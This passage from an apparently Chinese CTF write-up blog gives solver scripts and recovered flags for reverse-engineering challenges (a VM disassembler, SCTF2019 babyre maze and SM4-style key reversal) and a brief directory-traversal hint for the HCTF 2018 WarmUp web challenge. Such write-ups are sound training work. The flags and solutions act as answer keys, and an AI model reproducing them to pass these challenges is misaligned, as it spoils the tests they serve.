class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">19</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]=stack[DA5BD0+reg[%d]]&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">20</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]=DA5BA8[reg[%d]]&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">0xFF</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;exit&#x27;</span>)</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">        <span class="comment"># break</span></span><br><span class="line"></span><br><span class="line">a = [<span class="number">7</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">2</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">oth = [ord(<span class="string">&#x27;&#123;&#x27;</span>),ord(<span class="string">&#x27;&#125;&#x27;</span>),ord(<span class="string">&#x27;_&#x27;</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(a),<span class="number">2</span>):</span><br><span class="line">    t = a[i]*<span class="number">16</span>+a[i+<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> t <span class="keyword">in</span> oth:</span><br><span class="line">        flag+=chr(t)</span><br><span class="line">    <span class="keyword">elif</span> (t+<span class="number">1</span>)^<span class="number">75</span>&gt;=<span class="number">65</span> <span class="keyword">and</span> (t+<span class="number">1</span>)^<span class="number">75</span>&lt;=<span class="number">90</span>:</span><br><span class="line">        flag+=chr((t+<span class="number">1</span>)^<span class="number">75</span>)</span><br><span class="line">    <span class="keyword">elif</span> (t+<span class="number">1</span>)^<span class="number">71</span>&gt;=<span class="number">97</span> <span class="keyword">and</span> (t+<span class="number">1</span>)^<span class="number">71</span>&lt;=<span class="number">122</span>:</span><br><span class="line">        flag+=chr((t<span class="number">-1</span>)^<span class="number">71</span>)</span><br><span class="line">print(flag[::<span class="number">-1</span>])</span><br></pre></td></tr></table></figure>

flag&#123;Such_A_EZVM&#125;

## [web][HCTF 2018]WarmUp

1. 打开注释，发现source.php
2. 发现hint.php
3. 要求在白名单内
4. 需要目录穿越
   flag&#123;5cae09d5-ee32-4ee4-806a-519032a92250&#125;

## [rev][SCTF2019]babyre

1. flag存在3段

2. 第一段是走一个三维迷宫，实在懒得走了，写了个脚本，深度优先搜索走迷宫，结果脚本找到了程序的另一条路= =

   明白了，这一问是基于三维迷宫做的，所以应该改进脚本基于三维迷宫

3. 第二段flag是base64解码，所以只需要把base64编码的那段东西放进去就行

4. 第三段是仿sm4加密

   这里太不认真了ROR6看成了ROL6

脚本

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* name, <span class="keyword">uint8_t</span>* data, <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;==============%s========&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(i % <span class="number">16</span>))<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02x,&quot;</span>, data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n================================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">uint32_t</span> direc[] = &#123; <span class="number">-5</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">25</span>,<span class="number">-25</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> direcc[] = <span class="string">&quot;wsdaxy&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">uint32_t</span> pos = <span class="number">22</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* v;</span><br><span class="line"><span class="keyword">char</span> state[<span class="number">126</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pos &lt; <span class="number">0</span> || pos &gt;= <span class="built_in">strlen</span>(v))<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (state[pos] == <span class="string">&#x27;*&#x27;</span>)<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (state[pos] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(state[pos]!=<span class="string">&#x27;.&#x27;</span>&amp;&amp;state[pos]!=<span class="string">&#x27;s&#x27;</span>)<span class="keyword">return</span>;</span><br><span class="line">    state[pos] = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        pos += direc[i];</span><br><span class="line">        flag[cnt++] = direcc[i];</span><br><span class="line">        search();</span><br><span class="line">        cnt--;</span><br><span class="line">        pos -= direc[i];</span><br><span class="line">    &#125;</span><br><span class="line">    state[pos] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">uint32_t</span> sbox[] = &#123; <span class="number">0xd6</span>, <span class="number">0x90</span>, <span class="number">0xe9</span>, <span class="number">0xfe</span>, <span class="number">0xcc</span>, <span class="number">0xe1</span>, <span class="number">0x3d</span>, <span class="number">0xb7</span>, <span class="number">0x16</span>, <span class="number">0xb6</span>, <span class="number">0x14</span>, <span class="number">0xc2</span>, <span class="number">0x28</span>, <span class="number">0xfb</span>, <span class="number">0x2c</span>, <span class="number">0x5</span>, <span class="number">0x2b</span>, <span class="number">0x67</span>, <span class="number">0x9a</span>, <span class="number">0x76</span>, <span class="number">0x2a</span>, <span class="number">0xbe</span>, <span class="number">0x4</span>, <span class="number">0xc3</span>, <span class="number">0xaa</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x6</span>, <span class="number">0x99</span>, <span class="number">0x9c</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xf4</span>, <span class="number">0x91</span>, <span class="number">0xef</span>, <span class="number">0x98</span>, <span class="number">0x7a</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0xb</span>, <span class="number">0x43</span>, <span class="number">0xed</span>, <span class="number">0xcf</span>, <span class="number">0xac</span>, <span class="number">0x62</span>, <span class="number">0xe4</span>, <span class="number">0xb3</span>, <span class="number">0x1c</span>, <span class="number">0xa9</span>, <span class="number">0xc9</span>, <span class="number">0x8</span>, <span class="number">0xe8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xdf</span>, <span class="number">0x94</span>, <span class="number">0xfa</span>, <span class="number">0x75</span>, <span class="number">0x8f</span>, <span class="number">0x3f</span>, <span class="number">0xa6</span>, <span class="number">0x47</span>, <span class="number">0x7</span>, <span class="number">0xa7</span>, <span class="number">0xfc</span>, <span class="number">0xf3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0xba</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3c</span>, <span class="number">0x19</span>, <span class="number">0xe6</span>, <span class="number">0x85</span>, <span class="number">0x4f</span>, <span class="number">0xa8</span>, <span class="number">0x68</span>, <span class="number">0x6b</span>, <span class="number">0x81</span>, <span class="number">0xb2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xda</span>, <span class="number">0x8b</span>, <span class="number">0xf8</span>, <span class="number">0xeb</span>, <span class="number">0xf</span>, <span class="number">0x4b</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9d</span>, <span class="number">0x35</span>, <span class="number">0x1e</span>, <span class="number">0x24</span>, <span class="number">0xe</span>, <span class="number">0x5e</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xd1</span>, <span class="number">0xa2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7c</span>, <span class="number">0x3b</span>, <span class="number">0x1</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span>, <span class="number">0xd4</span>, <span class="number">0x0</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9f</span>, <span class="number">0xd3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x4c</span>, <span class="number">0x36</span>, <span class="number">0x2</span>, <span class="number">0xe7</span>, <span class="number">0xa0</span>, <span class="number">0xc4</span>, <span class="number">0xc8</span>, <span class="number">0x9e</span>, <span class="number">0xea</span>, <span class="number">0xbf</span>, <span class="number">0x8a</span>, <span class="number">0xd2</span>, <span class="number">0x40</span>, <span class="number">0xc7</span>, <span class="number">0x38</span>, <span class="number">0xb5</span>, <span class="number">0xa3</span>, <span class="number">0xf7</span>, <span class="number">0xf2</span>, <span class="number">0xce</span>, <span class="number">0xf9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xa1</span>, <span class="number">0xe0</span>, <span class="number">0xae</span>, <span class="number">0x5d</span>, <span class="number">0xa4</span>, <span class="number">0x9b</span>, <span class="number">0x34</span>, <span class="number">0x1a</span>, <span class="number">0x55</span>, <span class="number">0xad</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xf5</span>, <span class="number">0x8c</span>, <span class="number">0xb1</span>, <span class="number">0xe3</span>, <span class="number">0x1d</span>, <span class="number">0xf6</span>, <span class="number">0xe2</span>, <span class="number">0x2e</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xca</span>, <span class="number">0x60</span>, <span class="number">0xc0</span>, <span class="number">0x29</span>, <span class="number">0x23</span>, <span class="number">0xab</span>, <span class="number">0xd</span>, <span class="number">0x53</span>, <span class="number">0x4e</span>, <span class="number">0x6f</span>, <span class="number">0xd5</span>, <span class="number">0xdb</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xde</span>, <span class="number">0xfd</span>, <span class="number">0x8e</span>, <span class="number">0x2f</span>, <span class="number">0x3</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x72</span>, <span class="number">0x6d</span>, <span class="number">0x6c</span>, <span class="number">0x5b</span>, <span class="number">0x51</span>, <span class="number">0x8d</span>, <span class="number">0x1b</span>, <span class="number">0xaf</span>, <span class="number">0x92</span>, <span class="number">0xbb</span>, <span class="number">0xdd</span>, <span class="number">0xbc</span>, <span class="number">0x7f</span>, <span class="number">0x11</span>, <span class="number">0xd9</span>, <span class="number">0x5c</span>, <span class="number">0x41</span>, <span class="number">0x1f</span>, <span class="number">0x10</span>, <span class="number">0x5a</span>, <span class="number">0xd8</span>, <span class="number">0xa</span>, <span class="number">0xc1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xa5</span>, <span class="number">0xcd</span>, <span class="number">0x7b</span>, <span class="number">0xbd</span>, <span class="number">0x2d</span>, <span class="number">0x74</span>, <span class="number">0xd0</span>, <span class="number">0x12</span>, <span class="number">0xb8</span>, <span class="number">0xe5</span>, <span class="number">0xb4</span>, <span class="number">0xb0</span>, <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4a</span>, <span class="number">0xc</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7e</span>, <span class="number">0x65</span>, <span class="number">0xb9</span>, <span class="number">0xf1</span>, <span class="number">0x9</span>, <span class="number">0xc5</span>, <span class="number">0x6e</span>, <span class="number">0xc6</span>, <span class="number">0x84</span>, <span class="number">0x18</span>, <span class="number">0xf0</span>, <span class="number">0x7d</span>, <span class="number">0xec</span>, <span class="number">0x3a</span>, <span class="number">0xdc</span>, <span class="number">0x4d</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xee</span>, <span class="number">0x5f</span>, <span class="number">0x3e</span>, <span class="number">0xd7</span>, <span class="number">0xcb</span>, <span class="number">0x39</span>, <span class="number">0x48</span>, <span class="number">0xc6</span>, <span class="number">0xba</span>, <span class="number">0xb1</span>, <span class="number">0xa3</span>, <span class="number">0x50</span>, <span class="number">0x33</span>, <span class="number">0xaa</span>, <span class="number">0x56</span>, <span class="number">0x97</span>, <span class="number">0x91</span>, <span class="number">0x7d</span>, <span class="number">0x67</span>, <span class="number">0xdc</span>, <span class="number">0x22</span>, <span class="number">0x70</span>, <span class="number">0xb2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROL32(x,i) ((x)<span class="meta-string">&lt;&lt;(i)|(((unsigned int)(x)&gt;&gt;(32-(i)))))</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> tau(x) ((sbox[((x)&gt;&gt;16)&amp;0xFF]<span class="meta-string">&lt;&lt;16)|sbox[(x)&amp;0xFF]|(sbox[((x)&gt;&gt;8)&amp;0xFF]&lt;&lt;8)|(sbox[((x)&gt;&gt;24&amp;0xFF)]&lt;&lt;24))</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> L(x) ((ROL32((x),12))^(ROL32((x),8))^(ROL32((x),30))^(ROL32((x),26)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> v28[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    v28[<span class="number">0</span>] = <span class="number">3038287259199220266L</span>L;</span><br><span class="line">    v28[<span class="number">1</span>] = <span class="number">3039413159106062890L</span>L;</span><br><span class="line">    v28[<span class="number">2</span>] = <span class="number">3347065308717918762L</span>L;</span><br><span class="line">    v28[<span class="number">3</span>] = <span class="number">3038287259266591278L</span>L;</span><br><span class="line">    v28[<span class="number">4</span>] = <span class="number">3326517635351194154L</span>L;</span><br><span class="line">    v28[<span class="number">5</span>] = <span class="number">3038287259199220266L</span>L;</span><br><span class="line">    v28[<span class="number">6</span>] = <span class="number">3038287276446198314L</span>L;</span><br><span class="line">    v28[<span class="number">7</span>] = <span class="number">3036321349588626990L</span>L;</span><br><span class="line">    v28[<span class="number">8</span>] = <span class="number">3039417557152575022L</span>L;</span><br><span class="line">    v28[<span class="number">9</span>] = <span class="number">3038287259199482410L</span>L;</span><br><span class="line">    v28[<span class="number">10</span>] = <span class="number">3038287259199220266L</span>L;</span><br><span class="line">    v28[<span class="number">11</span>] = <span class="number">3326517635350932010L</span>L;</span><br><span class="line">    v28[<span class="number">12</span>] = <span class="number">3038287259266591274L</span>L;</span><br><span class="line">    v28[<span class="number">13</span>] = <span class="number">3326517652597910058L</span>L;</span><br><span class="line">    v28[<span class="number">14</span>] = <span class="number">3039413176353041966L</span>L;</span><br><span class="line">    v28[<span class="number">15</span>] = <span class="number">0x2A2E2A2A2E</span>LL;</span><br><span class="line">    v = (<span class="keyword">char</span>*)v28;</span><br><span class="line">    <span class="built_in">memcpy</span>(state, v, <span class="number">126</span>);</span><br><span class="line"></span><br><span class="line">    search();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printf(&quot;%s\n&quot;,v28);</span></span><br><span class="line">    <span class="keyword">uint64_t</span> f2 = <span class="number">3472619869582943091L</span>L; <span class="comment">// sctf_910 019_ftcs</span></span><br><span class="line">    <span class="keyword">uint32_t</span> a[] = &#123; <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x3e</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x3f</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x3a</span>, <span class="number">0x3b</span>, <span class="number">0x3c</span>, <span class="number">0x3d</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x40</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0a</span>, <span class="number">0x0b</span>, <span class="number">0x0c</span>, <span class="number">0x0d</span>, <span class="number">0x0e</span>, <span class="number">0x0f</span>, <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span>, <span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x1c</span>, <span class="number">0x1d</span>, <span class="number">0x1e</span>, <span class="number">0x1f</span>, <span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0x28</span>, <span class="number">0x29</span>, <span class="number">0x2a</span>, <span class="number">0x2b</span>, <span class="number">0x2c</span>, <span class="number">0x2d</span>, <span class="number">0x2e</span>, <span class="number">0x2f</span>, <span class="number">0x30</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span> &#125;;</span><br><span class="line">    <span class="keyword">uint8_t</span> dict[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(a) / <span class="number">4</span>; i++) &#123;</span><br><span class="line">        dict[a[i]] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, dict);</span><br><span class="line">    <span class="keyword">uint32_t</span> v8[<span class="number">15</span>];</span><br><span class="line">    v8[<span class="number">0</span>] = <span class="number">190</span>;</span><br><span class="line">    v8[<span class="number">1</span>] = <span class="number">4</span>;</span><br><span class="line">    v8[<span class="number">2</span>] = <span class="number">6</span>;</span><br><span class="line">    v8[<span class="number">3</span>] = <span class="number">128</span>;</span><br><span class="line">    v8[<span class="number">4</span>] = <span class="number">197</span>;</span><br><span class="line">    v8[<span class="number">5</span>] = <span class="number">175</span>;</span><br><span class="line">    v8[<span class="number">6</span>] = <span class="number">118</span>;</span><br><span class="line">    v8[<span class="number">7</span>] = <span class="number">71</span>;</span><br><span class="line">    v8[<span class="number">8</span>] = <span class="number">159</span>;</span><br><span class="line">    v8[<span class="number">9</span>] = <span class="number">204</span>;</span><br><span class="line">    v8[<span class="number">10</span>] = <span class="number">64</span>;</span><br><span class="line">    v8[<span class="number">11</span>] = <span class="number">31</span>;</span><br><span class="line">    v8[<span class="number">12</span>] = <span class="number">216</span>;</span><br><span class="line">    v8[<span class="number">13</span>] = <span class="number">191</span>;</span><br><span class="line">    v8[<span class="number">14</span>] = <span class="number">146</span>;</span><br><span class="line">    v8[<span class="number">15</span>] = <span class="number">239</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> k[<span class="number">30</span>];</span><br><span class="line">    k[<span class="number">29</span>] = v8[<span class="number">12</span>] &lt;&lt; <span class="number">24</span> | v8[<span class="number">13</span>] &lt;&lt; <span class="number">16</span> | v8[<span class="number">14</span>] &lt;&lt; <span class="number">8</span> | v8[<span class="number">15</span>];</span><br><span class="line">    k[<span class="number">28</span>] = v8[<span class="number">8</span>] &lt;&lt; <span class="number">24</span> | v8[<span class="number">9</span>] &lt;&lt; <span class="number">16</span> | v8[<span class="number">10</span>] &lt;&lt; <span class="number">8</span> | v8[<span class="number">11</span>];</span><br><span class="line">    k[<span class="number">27</span>] = v8[<span class="number">4</span>] &lt;&lt; <span class="number">24</span> | v8[<span class="number">5</span>] &lt;&lt; <span class="number">16</span> | v8[<span class="number">6</span>] &lt;&lt; <span class="number">8</span> | v8[<span class="number">7</span>];</span><br><span class="line">    k[<span class="number">26</span>] = v8[<span class="number">0</span>] &lt;&lt; <span class="number">24</span> | v8[<span class="number">1</span>] &lt;&lt; <span class="number">16</span> | v8[<span class="number">2</span>] &lt;&lt; <span class="number">8</span> | v8[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">25</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> t = k[i + <span class="number">1</span>] ^ k[i + <span class="number">2</span>] ^ k[i + <span class="number">3</span>];</span><br><span class="line">        <span class="keyword">uint32_t</span> t1 = tau(t);</span><br><span class="line">        <span class="keyword">uint32_t</span> t2 = L(t1);</span><br><span class="line">        <span class="comment">// printf(&quot;0x%x\n&quot;,t2);</span></span><br><span class="line">        k[i] = k[i+<span class="number">4</span>] ^ t2;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printArray(&#x27;key&#x27;,k,16);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,k);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

sctf&#123;ddwwxxssxaxwwaasasyywwdd-c2N0Zl85MTAy(fl4g_is_s0_ug1y!)&#125;

## [rev][WUSTCTF2020]funnyre

1. 进入主函数

2. 发现一大堆xor,add,++,~处理

3. 拷贝所有反编译后的代码，使用正则表达式处理，得到以下一些东西

   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 